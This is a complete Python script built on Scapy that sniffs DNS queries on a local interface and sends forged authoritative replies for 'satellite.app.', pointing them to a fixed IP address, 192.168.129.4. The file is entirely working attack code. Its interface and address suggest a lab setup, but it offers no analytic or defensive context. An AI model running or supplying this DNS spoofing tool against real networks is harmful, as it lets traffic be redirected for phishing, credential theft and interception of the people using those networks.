#!/usr/bin/env python3
from scapy.layers.inet import IP, UDP
from scapy.layers.dns import DNS, DNSRR
from scapy.sendrecv import sniff, send
import sys

# Replace these values as needed
TARGET_DOMAIN = b"satellite.app."  # Note the trailing dot
FAKE_IP = "192.168.129.4"  # The fake IP address you want to send
INTERFACE = "enp0s8"  # Change to your network interface


def dns_spoof(pkt):
    # Check if the packet has a DNS query layer
    if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:  # qr==0 means it's a query
        dns_layer = pkt.getlayer(DNS)
        query_name = dns_layer.qd.qname

        # Check if this is a query for the targeted domain.
        if TARGET_DOMAIN in query_name:
            print(f"[+] Spoofing response for {query_name.decode()} to {FAKE_IP}")

            # Build DNS answer packet using details from the original request.
            spoofed_pkt = (
                IP(src=pkt[IP].dst, dst=pkt[IP].src)
                / UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)
                / DNS(
                    id=dns_layer.id,
                    qr=1,
                    aa=1,
                    qd=dns_layer.qd,
                    an=DNSRR(rrname=query_name, ttl=10, rdata=FAKE_IP),
                )
            )

            # Send the spoofed response. Setting verbose=0 to reduce output noise.
            send(spoofed_pkt, verbose=0)


def main():
    print(f"[*] Starting DNS spoofing on interface {INTERFACE}")

    # Note: You might need root/administrator privileges to run this script.
    try:
        sniff(filter="udp port 53", prn=dns_spoof, iface=INTERFACE, store=0)
    except KeyboardInterrupt:
        print("\n[*] Stopping DNS spoofing")
        sys.exit(0)


if __name__ == "__main__":
    main()
